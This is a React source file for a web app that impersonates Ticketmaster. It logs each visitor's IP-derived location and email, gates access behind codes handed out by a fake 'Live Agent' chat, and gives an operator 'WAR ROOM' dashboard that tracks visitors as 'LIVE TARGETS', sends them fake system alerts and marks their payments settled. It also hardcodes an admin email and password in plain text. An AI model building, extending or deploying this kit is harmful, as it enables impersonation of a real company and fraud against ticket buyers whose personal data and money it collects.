import React, { useState, useEffect } from 'react';
import { Search, User, CheckCircle, MessageSquare, Send, X, Bell, DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft, LogIn, UserPlus } from 'lucide-react';
import { onSnapshot, collection, addDoc, updateDoc, doc, setDoc, getDoc } from 'firebase/firestore';
import { signInAnonymously, onAuthStateChanged } from 'firebase/auth';
import { auth, db, appId } from './firebase';

import SeatMap from './components/SeatMap.jsx';
import Checkout from './components/Checkout.jsx';

// ============================================================
// 1. ADMIN PERSONAL DETAILS (CHANGE THESE TO YOUR SECRETS)
const ADMIN_EMAIL = "buyticketsmaster.org@gmail.com"; 
const ADMIN_PASSWORD = "Ifeoluwapo@1$!";
// ============================================================

const INITIAL_EVENTS = [
  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
  { id: 3, artist: "Adele: Weekends in Vegas", venue: "The Colosseum, Caesars Palace", date: "Sat • Oct 12 • 8:00 PM", image: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1493225255756-d9584f8606e9?auto=format&fit=crop&q=80&w=2000", status: "low_inventory", timeRemaining: "05:12:00" }
];

export default function App() {
  const [user, setUser] = useState(null);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [cart, setCart] = useState([]); 
  const [sessions, setSessions] = useState([]); 
  const [currentSessionId, setCurrentSessionId] = useState(null);
  const [globalSettings, setGlobalSettings] = useState({ price: 250, bgImage: '', presaleCode: 'FAN2024' });
  
  const [searchTerm, setSearchTerm] = useState('');
  const [authMode, setAuthMode] = useState('login'); // login, signup
  const [authStep, setAuthStep] = useState('email'); 
  const [tempUser, setTempUser] = useState({ email: '', name: '' });
  
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState([]);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [activeNotification, setActiveNotification] = useState(null);

  useEffect(() => {
    signInAnonymously(auth);
    return onAuthStateChanged(auth, setUser);
  }, []);

  useEffect(() => {
    if (!user) return;
    const startSession = async () => {
      let location = "Detecting...";
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        location = `${data.city}, ${data.country_name}`;
      } catch (e) { location = "Unknown City"; }

      const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
      const newSession = await addDoc(sessionsRef, {
        createdAt: new Date().toISOString(),
        userId: user.uid,
        location,
        status: 'browsing',
        email: 'Not Set',
        userAuthCode: '', 
        notifications: [],
        chatHistory: [{ sender: 'system', text: 'Welcome to Ticketmaster Support. How can we verify your account today?', timestamp: new Date().toISOString() }]
      });
      setCurrentSessionId(newSession.id);
    };
    startSession();
  }, [user]);

  useEffect(() => {
    if (!user) return;
    const configRef = doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings');
    return onSnapshot(configRef, (docSnap) => {
      if (docSnap.exists()) setGlobalSettings(docSnap.data());
    });
  }, [user]);

  useEffect(() => {
    if (!currentSessionId) return;
    const sessionRef = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId);
    return onSnapshot(sessionRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.chatHistory) setChatMessages(data.chatHistory);
        if (data.notifications && data.notifications.length > 0) {
          setActiveNotification(data.notifications[data.notifications.length - 1]);
        }
      }
    });
  }, [currentSessionId]);

  useEffect(() => {
    if (!user || !isAdminLoggedIn) return;
    const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
    return onSnapshot(sessionsRef, (snapshot) => {
      setSessions(snapshot.docs.map(d => ({ id: d.id, ...d.data() })).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
    });
  }, [user, isAdminLoggedIn]);

  const updateSession = async (sid, updates) => await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), updates);
  const sendChatMessage = async (sid, text, sender) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const currentChat = snap.data().chatHistory || [];
      await updateDoc(ref, { chatHistory: [...currentChat, { sender, text, timestamp: new Date().toISOString() }] });
    }
  };

  const filteredEvents = INITIAL_EVENTS.filter(ev => ev.artist.toLowerCase().includes(searchTerm.toLowerCase()));
  const mySessionData = sessions.find(s => s.id === currentSessionId) || {};

  return (
    <div className="min-h-screen font-sans text-gray-900 bg-white relative overflow-x-hidden no-select">
      {/* HEADER */}
      <header className="fixed top-0 w-full z-50 bg-[#1f262d] text-white h-16 flex items-center px-4 justify-between shadow-2xl">
        <div className="flex items-center gap-3">
          {currentPage !== 'home' && (
            <button onClick={() => setCurrentPage('home')} className="hover:bg-white/10 p-2 rounded-full transition-all">
              <ChevronLeft className="w-6 h-6" />
            </button>
          )}
          <div className="flex items-center gap-1 cursor-pointer shrink-0" onClick={() => setCurrentPage('home')}>
            <span className="font-bold text-2xl tracking-tighter">ticketmaster</span>
            <div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center">
              <CheckCircle className="w-3.5 h-3.5 text-white stroke-[3]" />
            </div>
          </div>
        </div>

        {/* Global Search */}
        <div className="hidden md:flex flex-1 max-w-lg mx-8 relative">
          <input 
            type="text" 
            placeholder="Search millions of events..." 
            className="w-full bg-white/10 border border-gray-600 rounded-full py-2.5 pl-11 pr-4 text-sm focus:bg-white focus:text-gray-900 focus:outline-none transition-all"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
          <Search className="absolute left-4 top-3 w-4 h-4 text-gray-400" />
        </div>

        <div className="flex items-center gap-4 shrink-0 relative">
          {/* Membership Badge */}
          <div className="flex items-center gap-2 text-[10px] font-black text-[#026cdf] bg-blue-500/10 px-3 py-1.5 rounded-full border border-blue-500/20">
            <Star className="w-3 h-3 fill-current" />
            <span className="hidden sm:inline uppercase tracking-widest">Verified Fan Member</span>
          </div>

          <div className="relative cursor-pointer" onClick={() => setActiveNotification(null)}>
            <Bell className="w-5 h-5" />
            {activeNotification && <div className="absolute -top-1 -right-1 w-3.5 h-3.5 bg-red-600 rounded-full border-2 border-[#1f262d] animate-pulse" />}
          </div>
          
          <div onClick={() => setCurrentPage('admin')} className="cursor-pointer hover:text-[#026cdf] transition-colors p-1">
             <User className="w-6 h-6" />
          </div>
        </div>
      </header>

      {/* NOTIFICATION TOAST */}
      {activeNotification && (
        <div className="fixed top-20 left-1/2 -translate-x-1/2 z-[100] w-[90vw] max-w-md bg-[#026cdf] text-white p-5 rounded-3xl shadow-2xl flex items-start gap-4 animate-slideDown border-b-4 border-blue-800">
           <Bell className="shrink-0 mt-1 w-6 h-6" />
           <div className="flex-1">
              <p className="font-black text-sm uppercase tracking-tighter">System Message</p>
              <p className="text-xs font-medium opacity-90 leading-tight">{activeNotification.text}</p>
           </div>
           <X className="cursor-pointer w-5 h-5" onClick={() => setActiveNotification(null)} />
        </div>
      )}

      {/* MAIN VIEWPORT */}
      <main className="pt-16 min-h-screen relative z-10">
        {currentPage === 'home' && (
          <HomeView 
            events={filteredEvents} 
            searchTerm={searchTerm} 
            setSearchTerm={setSearchTerm} 
            onSelect={(e) => {setSelectedEvent(e); setCurrentPage('auth');}} 
          />
        )}
        
        {currentPage === 'auth' && (
          <AuthGate 
            mode={authMode}
            setMode={setAuthMode}
            step={authStep} 
            setStep={setAuthStep} 
            tempUser={tempUser} 
            setTempUser={setTempUser} 
            sessionData={mySessionData}
            onComplete={() => {
              setCurrentPage('seatmap'); 
              updateSession(currentSessionId, { status: 'viewing_map', email: tempUser.email, name: tempUser.name });
            }} 
          />
        )}
        
        {currentPage === 'seatmap' && (
          <SeatMap 
            event={selectedEvent} 
            presaleCode={globalSettings.presaleCode} 
            cart={cart} 
            setCart={setCart} 
            globalPrice={globalSettings.price} 
            onCheckout={() => {
              updateSession(currentSessionId, { status: 'payment_pending', cart });
              setCurrentPage('checkout');
            }} 
          />
        )}
        
        {currentPage === 'checkout' && (
          <Checkout 
            cart={cart} 
            sessionId={currentSessionId} 
            sessionData={mySessionData} 
            updateSession={updateSession} 
            onSuccess={() => setCurrentPage('success')} 
            onBack={() => setCurrentPage('seatmap')} 
          />
        )}
        
        {currentPage === 'success' && <SuccessScreen event={selectedEvent} cart={cart} onHome={() => setCurrentPage('home')} />}
        
        {currentPage === 'admin' && (
          <AdminDashboard 
            correctEmail={ADMIN_EMAIL}
            correctPass={ADMIN_PASSWORD}
            isLoggedIn={isAdminLoggedIn} 
            setLoggedIn={setIsAdminLoggedIn} 
            sessions={sessions} 
            updateSession={updateSession} 
            globalSettings={globalSettings} 
            updateGlobalSettings={(s) => setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), s)} 
            sendChatMessage={sendChatMessage} 
            onExit={() => setCurrentPage('home')} 
          />
        )}
      </main>

      {/* CHAT WIDGET */}
      <div className={`fixed bottom-6 right-6 z-[60] transition-all duration-500 ${currentPage === 'seatmap' || currentPage === 'checkout' ? 'translate-y-[-85px] sm:translate-y-0' : ''}`}>
        <button 
          onClick={() => setIsChatOpen(!isChatOpen)} 
          className="bg-[#026cdf] text-white p-4 rounded-[22px] shadow-[0_15px_40px_rgba(2,108,223,0.5)] hover:scale-110 active:scale-95 transition-all"
        >
          {isChatOpen ? <X /> : <MessageSquare />}
        </button>
      </div>

      {isChatOpen && (
        <div className="fixed bottom-24 right-6 w-[92vw] max-w-[360px] h-[480px] bg-white border shadow-[0_30px_100px_rgba(0,0,0,0.4)] rounded-[35px] z-[70] flex flex-col overflow-hidden animate-slideUp">
          <div className="bg-[#1f262d] text-white p-5 flex justify-between items-center border-b border-white/5">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-xs shadow-lg">TM</div>
              <div>
                <p className="font-black text-xs uppercase tracking-widest">Live Support</p>
                <div className="flex items-center gap-1"><div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" /><p className="text-[8px] font-bold text-gray-400 uppercase">Agent Connected</p></div>
              </div>
            </div>
            <X className="cursor-pointer w-5 h-5 text-gray-500 hover:text-white" onClick={() => setIsChatOpen(false)} />
          </div>
          <div className="flex-1 overflow-y-auto p-5 space-y-4 bg-gray-50">
            {chatMessages.map((m, i) => (
              <div key={i} className={`flex ${m.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                <div className={`max-w-[85%] p-4 rounded-2xl text-[13px] font-medium leading-relaxed shadow-sm ${m.sender === 'user' ? 'bg-[#026cdf] text-white rounded-br-none' : 'bg-white border rounded-bl-none text-gray-800'}`}>
                  {m.text}
                </div>
              </div>
            ))}
          </div>
          <div className="p-4 border-t bg-white flex gap-2">
            <input 
              id="user-chat-input"
              placeholder="Type your message..." 
              className="flex-1 bg-gray-100 border-none p-4 rounded-2xl text-sm focus:ring-2 focus:ring-[#026cdf] outline-none transition-all" 
              onKeyDown={(e) => { 
                if(e.key === 'Enter' && e.target.value.trim()){ 
                  sendChatMessage(currentSessionId, e.target.value, 'user'); 
                  e.target.value = ''; 
                } 
              }} 
            />
            <button 
              onClick={() => {
                const inp = document.getElementById('user-chat-input');
                if(inp.value.trim()){ sendChatMessage(currentSessionId, inp.value, 'user'); inp.value = ''; }
              }}
              className="bg-[#026cdf] text-white p-4 rounded-2xl shadow-xl hover:bg-blue-700 active:scale-90 transition-all"
            >
              <Send className="w-5 h-5" />
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

// --- SUB COMPONENTS ---

function HomeView({ events, searchTerm, setSearchTerm, onSelect }) {
  return (
    <div className="max-w-7xl mx-auto p-4 sm:p-10 space-y-16 pb-32">
      <div className="relative h-[480px] rounded-[60px] overflow-hidden shadow-2xl flex items-center justify-center p-8 text-center border-4 border-white/5 group">
        <div className="absolute inset-0 bg-gradient-to-t from-black via-black/30 to-transparent z-10" />
        <img src="https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000" className="absolute inset-0 w-full h-full object-cover transition-transform duration-[10s] group-hover:scale-110" />
        <div className="relative z-20 text-white max-w-4xl animate-fadeIn space-y-8">
          <h1 className="text-6xl md:text-9xl font-black tracking-tighter leading-none italic uppercase">LETS MAKE <span className="text-[#026cdf] drop-shadow-[0_0_20px_#026cdf]">MEMORIES</span>.</h1>
          <p className="text-xl md:text-2xl font-bold text-gray-200 opacity-90">Secure official tickets for the biggest global tours.</p>
          <div className="bg-white/10 backdrop-blur-2xl border border-white/20 rounded-[40px] p-2 flex shadow-2xl max-w-2xl mx-auto group-focus-within:bg-white transition-all">
             <input 
               className="flex-1 bg-transparent px-8 py-4 rounded-full text-white font-bold placeholder:text-gray-400 focus:outline-none focus:text-gray-900" 
               placeholder="Find millions of events..." 
               value={searchTerm}
               onChange={(e) => setSearchTerm(e.target.value)}
             />
             <button className="bg-[#026cdf] px-12 py-5 rounded-[32px] font-black text-sm uppercase tracking-widest shadow-2xl shadow-blue-500/40 hover:bg-blue-600 active:scale-95 transition-all">Search</button>
          </div>
        </div>
      </div>

      <div className="space-y-12">
        <div className="flex justify-between items-end px-4">
          <h2 className="text-4xl font-black text-gray-900 tracking-tighter italic">FEATURED <span className="text-[#026cdf]">TOURS</span></h2>
          <span className="text-[10px] font-black text-gray-400 tracking-[0.4em] uppercase hidden sm:block">Explore Your World</span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-12">
          {events.map(ev => (
            <div key={ev.id} onClick={() => onSelect(ev)} className="bg-white rounded-[55px] overflow-hidden shadow-sm border border-gray-100 hover:shadow-[0_50px_100px_rgba(0,0,0,0.1)] hover:translate-y-[-12px] transition-all duration-700 cursor-pointer group">
              <div className="h-80 relative overflow-hidden">
                 <img src={ev.image} className="w-full h-full object-cover group-hover:scale-125 transition-transform duration-[2s]" />
                 <div className="absolute inset-0 bg-gradient-to-t from-black/70 via-transparent to-transparent opacity-80" />
                 <div className="absolute top-8 left-8 flex flex-col gap-3">
                    <div className="bg-[#ea0042] text-white px-4 py-2 rounded-full text-[10px] font-black uppercase shadow-xl animate-pulse">Selling Fast</div>
                    {ev.timeRemaining !== "00:00:00" && <div className="bg-black/40 backdrop-blur-md text-white px-3 py-1.5 rounded-full text-[9px] font-bold uppercase border border-white/20">Starts: {ev.timeRemaining}</div>}
                 </div>
              </div>
              <div className="p-10 space-y-6">
                 <h3 className="text-3xl font-black leading-tight text-gray-900 group-hover:text-[#026cdf] transition-colors uppercase italic">{ev.artist}</h3>
                 <div className="space-y-1">
                    <p className="text-gray-400 font-bold text-[11px] uppercase tracking-[0.2em]">{ev.venue}</p>
                    <p className="text-gray-900 font-black text-[10px] uppercase tracking-widest">{ev.date}</p>
                 </div>
                 <div className="pt-6 border-t border-gray-100 flex justify-between items-center">
                    <div className="flex items-center gap-1.5">
                       <ShieldCheck className="w-4 h-4 text-[#026cdf]" />
                       <span className="text-[10px] font-black uppercase text-[#026cdf] tracking-widest">{ev.status} Ticket</span>
                    </div>
                    <ChevronLeft className="w-5 h-5 rotate-180 text-gray-300 group-hover:text-[#026cdf] transition-colors" />
                 </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function AuthGate({ mode, setMode, step, setStep, tempUser, setTempUser, sessionData, onComplete }) {
  const [loading, setLoading] = useState(false);
  const [vCode, setVCode] = useState('');
  const [error, setError] = useState('');

  const next = () => { 
    if(step === 'verify' && !vCode) return;
    setLoading(true); 
    setError('');
    setTimeout(() => { 
      setLoading(false); 
      if(step==='email') setStep(mode === 'signup' ? 'signup' : 'verify'); 
      else if(step==='signup') setStep('verify'); 
      else {
        if (vCode === sessionData.userAuthCode && vCode !== '') {
           onComplete();
        } else {
           setError("Access Denied. Unique Fan Code mismatch.");
        }
      }
    }, 1200); 
  };
  
  return (
    <div className="min-h-[85vh] flex items-center justify-center p-6 bg-gray-50/50">
      <div className="bg-white w-full max-w-md rounded-[55px] shadow-[0_60px_120px_rgba(0,0,0,0.1)] p-12 border border-white space-y-10 animate-slideUp relative">
        <div className="absolute top-8 right-12 flex gap-4 text-[10px] font-black uppercase tracking-widest">
           <button onClick={() => {setMode('login'); setStep('email');}} className={mode==='login' ? 'text-[#026cdf]' : 'text-gray-300'}>Sign In</button>
           <button onClick={() => {setMode('signup'); setStep('email');}} className={mode==='signup' ? 'text-[#026cdf]' : 'text-gray-300'}>Sign Up</button>
        </div>

        <div className="text-center space-y-3 pt-4">
           <div className="w-20 h-20 bg-blue-50 rounded-[35px] flex items-center justify-center mx-auto mb-6 shadow-inner"><User className="text-[#026cdf] w-10 h-10" /></div>
           <h2 className="text-4xl font-black tracking-tighter uppercase italic">{mode === 'login' ? 'Welcome Back' : 'Join the Tour'}</h2>
           <p className="text-gray-400 text-[10px] font-bold uppercase tracking-widest">Verified Fan Identity Protocol</p>
        </div>
        
        {step === 'email' && (
          <div className="space-y-6">
             <input className="w-full border-2 border-gray-100 p-5 rounded-[28px] focus:border-[#026cdf] focus:ring-8 focus:ring-blue-500/5 outline-none transition-all font-bold" placeholder="Email Address" value={tempUser.email} onChange={e=>setTempUser({...tempUser, email:e.target.value})} />
             <button onClick={next} className="w-full bg-[#026cdf] text-white py-5 rounded-[28px] font-black shadow-2xl shadow-blue-500/40 hover:translate-y-[-2px] active:translate-y-0 transition-all uppercase tracking-widest">
               {loading ? 'Authenticating...' : 'Next'}
             </button>
          </div>
        )}
        
        {step === 'signup' && (
          <div className="space-y-4 animate-fadeIn">
             <input className="w-full border-2 border-gray-100 p-5 rounded-[28px] outline-none font-bold" placeholder="Full Legal Name" value={tempUser.name} onChange={e=>setTempUser({...tempUser, name:e.target.value})} />
             <input className="w-full border-2 border-gray-100 p-5 rounded-[28px] outline-none font-bold" type="password" placeholder="Account Password" />
             <button onClick={next} className="w-full bg-black text-white py-5 rounded-[28px] font-black shadow-2xl uppercase tracking-widest transition-all">
               {loading ? 'Securing Profile...' : 'Create Account'}
             </button>
          </div>
        )}
        
        {step === 'verify' && (
          <div className="space-y-8 animate-fadeIn">
             <div className="bg-[#026cdf]/5 p-6 rounded-[35px] border-2 border-dashed border-[#026cdf]/20 text-center">
                <p className="text-[11px] text-[#026cdf] font-black leading-relaxed uppercase tracking-wider">
                  Verification Required.<br/>To prevent bot access, please message our <span className="underline">Live Agent</span> to receive your unique 6-digit access code.
                </p>
             </div>
             <div className="space-y-4">
                <input 
                  className={`w-full border-2 p-6 rounded-[28px] text-center font-black tracking-[0.8em] text-3xl outline-none transition-all shadow-inner ${error ? 'border-red-500 bg-red-50 text-red-600' : 'border-gray-100'}`} 
                  placeholder="0000" 
                  value={vCode}
                  onChange={e=>setVCode(e.target.value)}
                  maxLength={6} 
                />
                {error && <p className="text-red-600 text-[10px] font-black text-center uppercase tracking-widest animate-shake">{error}</p>}
             </div>
             <button onClick={next} className="w-full bg-[#026cdf] text-white py-5 rounded-[28px] font-black shadow-2xl uppercase tracking-widest hover:scale-[1.02] active:scale-95 transition-all">
               {loading ? 'Verifying...' : 'Access My Tickets'}
             </button>
          </div>
        )}
      </div>
    </div>
  );
}

function SuccessScreen({ event, cart, onHome }) {
  const [showPrize, setShowPrize] = useState(false);
  useEffect(() => { setTimeout(() => setShowPrize(true), 800); }, []);
  const total = (cart.reduce((a,b)=>a+b.price,0) + (cart.length * 19.50) + 5.00).toFixed(2);
  return (
    <div className="min-h-screen bg-[#026cdf] flex items-center justify-center p-6 overflow-hidden relative">
      <div className="absolute inset-0 pointer-events-none opacity-40">
         {[...Array(35)].map((_, i) => (
           <div key={i} className={`absolute w-3 h-10 bg-white rounded-full animate-confetti`} style={{ left: `${Math.random()*100}%`, animationDelay: `${Math.random()*2.5}s`, top: `-50px` }} />
         ))}
      </div>
      <div className={`bg-white w-full max-w-lg rounded-[70px] p-14 text-center shadow-[0_100px_200px_rgba(0,0,0,0.4)] transition-all duration-1000 transform ${showPrize ? 'scale-100 translate-y-0 opacity-100' : 'scale-75 translate-y-40 opacity-0'}`}>
         <div className="w-32 h-32 bg-green-500 rounded-[45px] flex items-center justify-center mx-auto mb-10 shadow-[0_30px_70px_rgba(34,197,94,0.4)] animate-bounce">
           <CheckCircle className="text-white w-16 h-16 stroke-[4]" />
         </div>
         <h1 className="text-5xl font-black text-gray-900 leading-tight mb-4 tracking-tighter uppercase italic">YOU GOT THE TICKETS!</h1>
         <p className="text-gray-400 font-black mb-12 text-xs uppercase tracking-[0.4em]">Official Mobile Receipt Secured</p>
         <div className="bg-gray-50 rounded-[50px] p-10 border-4 border-dashed border-gray-100 mb-12 space-y-4 shadow-inner">
            <Ticket className="w-14 h-14 text-[#026cdf] mx-auto mb-2" />
            <p className="text-[10px] text-gray-300 font-black uppercase tracking-[0.5em]">Payment Finalized</p>
            <p className="text-7xl font-black text-gray-900 tracking-tighter">${total}</p>
         </div>
         <button onClick={onHome} className="w-full bg-[#1f262d] text-white py-6 rounded-[35px] font-black text-xl hover:bg-black transition-all shadow-2xl active:scale-95 uppercase tracking-widest italic">OPEN MY MOBILE TICKETS</button>
      </div>
    </div>
  );
}

function AdminDashboard({ correctEmail, correctPass, isLoggedIn, setLoggedIn, sessions, updateSession, globalSettings, updateGlobalSettings, sendChatMessage, onExit }) {
  const [uInput, setUInput] = useState(''); 
  const [pInput, setPInput] = useState('');
  const [config, setConfig] = useState(globalSettings);

  const sendNotification = async (sid, text) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const currentNotifs = snap.data().notifications || [];
      await updateDoc(ref, { notifications: [...currentNotifs, { text, timestamp: new Date().toISOString() }] });
    }
  };

  const attemptLogin = () => {
    if (uInput === correctEmail && pInput === correctPass) {
      setLoggedIn(true);
    }
  };

  if(!isLoggedIn) return (
    <div className="min-h-[90vh] flex items-center justify-center p-6">
      <div className="bg-white p-14 rounded-[65px] w-full max-w-sm shadow-[0_60px_120px_rgba(0,0,0,0.2)] space-y-12 animate-slideUp border border-gray-50">
        <div className="text-center space-y-3">
           <div className="w-20 h-20 bg-gray-50 rounded-[35px] flex items-center justify-center mx-auto mb-4 border-4 border-white shadow-xl"><LogIn className="w-10 h-10 text-[#026cdf]" /></div>
           <h2 className="text-4xl font-black uppercase tracking-tighter italic">WAR ROOM</h2>
           <p className="text-[10px] text-gray-400 font-bold uppercase tracking-[0.3em]">Encrypted Command Access</p>
        </div>
        <div className="space-y-5">
           <input placeholder="Admin Email" className="border-2 w-full p-5 rounded-[28px] outline-none focus:border-[#026cdf] font-bold shadow-inner" value={uInput} onChange={ev=>setUInput(ev.target.value)}/>
           <input type="password" placeholder="Passkey" className="border-2 w-full p-5 rounded-[28px] outline-none focus:border-[#026cdf] font-bold shadow-inner" value={pInput} onChange={ev=>setPInput(ev.target.value)}/>
           <button onClick={attemptLogin} className="bg-[#026cdf] text-white w-full py-5 rounded-[28px] font-black shadow-2xl hover:bg-blue-700 active:scale-95 transition-all uppercase tracking-widest mt-6">Authorize System</button>
        </div>
      </div>
    </div>
  );
  
  return (
    <div className="min-h-screen bg-[#f1f5f9] p-4 md:p-12">
      <div className="max-w-7xl mx-auto space-y-12">
        <div className="flex justify-between items-center bg-white p-8 rounded-[45px] shadow-2xl border border-white">
          <h1 className="text-4xl font-black uppercase tracking-tighter flex items-center gap-5 italic">
            <div className="w-5 h-5 bg-green-500 rounded-full animate-pulse shadow-[0_0_30px_#22c55e]" /> WAR ROOM DASHBOARD
          </h1>
          <button onClick={onExit} className="bg-red-600 text-white px-10 py-4 rounded-full font-black text-xs uppercase tracking-widest shadow-2xl hover:bg-red-700 active:scale-95 transition-all">TERMINATE SESSION</button>
        </div>
        
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-12">
          <div className="bg-white p-12 rounded-[60px] shadow-2xl border-4 border-white space-y-10 h-fit sticky top-20">
            <h3 className="font-black text-2xl uppercase flex items-center gap-3 italic"><DollarSign className="w-8 h-8 text-green-600" /> Global Sync</h3>
            <div className="space-y-8">
               <div><label className="text-[11px] font-black text-gray-400 block mb-3 uppercase tracking-widest">Base Seat Price ($)</label><input type="number" className="w-full border-2 p-5 rounded-3xl font-black text-2xl text-blue-600" value={config.price} onChange={ev=>setConfig({...config, price: Number(ev.target.value)})}/></div>
               <div><label className="text-[11px] font-black text-gray-400 block mb-3 uppercase tracking-widest">Global Fan Access Code</label><input className="w-full border-2 p-5 rounded-3xl font-black uppercase tracking-widest" value={config.presaleCode} onChange={ev=>setConfig({...config, presaleCode: ev.target.value})}/></div>
               <div><label className="text-[11px] font-black text-gray-400 block mb-3 uppercase tracking-widest">Master Wallpaper URL</label><input className="w-full border-2 p-5 rounded-3xl text-[11px] font-bold bg-gray-50 overflow-hidden" value={config.bgImage} onChange={ev=>setConfig({...config, bgImage: ev.target.value})}/></div>
               <button onClick={()=>updateGlobalSettings(config)} className="w-full bg-[#026cdf] text-white py-6 rounded-[30px] font-black shadow-[0_25px_60px_rgba(2,108,223,0.4)] uppercase tracking-widest hover:scale-[1.03] transition-all">DEPLOY GLOBAL ARTIFACTS</button>
            </div>
          </div>
          
          <div className="lg:col-span-2 bg-white p-12 rounded-[60px] shadow-2xl border-4 border-white space-y-12">
            <h3 className="font-black text-2xl uppercase flex items-center gap-4 italic"><User className="w-8 h-8 text-[#026cdf]" /> LIVE TARGETS ({sessions.length})</h3>
            <div className="space-y-10 max-h-[900px] overflow-y-auto pr-6 scroll-pro">
              {sessions.map(s=>(
                <div key={s.id} className="bg-gray-50 p-10 rounded-[50px] border-4 border-white space-y-8 group hover:border-[#026cdf]/20 transition-all shadow-xl">
                  <div className="flex justify-between items-start">
                    <div className="space-y-2">
                      <div className="text-2xl font-black text-blue-900 uppercase italic leading-none tracking-tight">{s.name || 'Anonymous Visitor'}</div>
                      <div className="text-[12px] text-gray-400 font-black uppercase tracking-widest">{s.location}</div>
                      <div className="text-[10px] text-gray-500 font-bold bg-white px-2 py-1 rounded-md border inline-block">{s.email}</div>
                    </div>
                    <div className="bg-white px-6 py-3 rounded-full text-[11px] font-black text-[#026cdf] border-2 border-blue-100 uppercase tracking-widest shadow-sm">{s.status}</div>
                  </div>

                  <div className="grid grid-cols-2 gap-8">
                    <div className="bg-white p-6 rounded-[35px] border-2 border-gray-100 shadow-inner">
                       <label className="text-[10px] font-black text-gray-400 uppercase block mb-3 tracking-widest">Assigned Access Code</label>
                       <input className="w-full font-black text-[#026cdf] text-4xl outline-none placeholder:text-gray-100 uppercase" placeholder="XXXX" onBlur={(e) => updateSession(s.id, { userAuthCode: e.target.value })} defaultValue={s.userAuthCode} />
                    </div>
                    <div className="bg-white p-6 rounded-[35px] border-2 border-gray-100 shadow-inner">
                       <label className="text-[10px] font-black text-gray-400 uppercase block mb-3 tracking-widest">Deploy Red-Dot Alert</label>
                       <div className="flex gap-3">
                          <input className="flex-1 text-[11px] font-bold outline-none uppercase placeholder:text-gray-300" placeholder="URGENT MSG..." id={`ping-${s.id}`} />
                          <button onClick={() => sendNotification(s.id, document.getElementById(`ping-${s.id}`).value)} className="bg-red-600 text-white px-6 rounded-2xl font-black text-[11px] shadow-2xl active:scale-90 transition-all">PING</button>
                       </div>
                    </div>
                  </div>

                  <div className="flex gap-4">
                    <div className="flex-1 relative group">
                       <input className="w-full bg-white border-2 border-gray-100 p-5 rounded-[28px] text-sm font-bold outline-none focus:border-[#026cdf] transition-all" placeholder="Direct Agent Message..." onKeyDown={e => { if(e.key==='Enter'){ sendChatMessage(s.id, e.target.value, 'system'); e.target.value='' } }} />
                       <Send className="absolute right-6 top-5 w-5 h-5 text-gray-300 group-focus-within:text-[#026cdf]" />
                    </div>
                    <button onClick={() => updateSession(s.id, {status: 'payment_complete'})} className="bg-green-600 text-white px-10 rounded-[28px] font-black text-xs uppercase shadow-2xl hover:bg-green-700 active:scale-95 transition-all tracking-widest">SETTLE</button>
                  </div>
                </div>
              ))}
              {sessions.length === 0 && <div className="py-24 text-center font-black text-gray-300 uppercase tracking-[0.8em] opacity-50">No Active Data Flows</div>}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

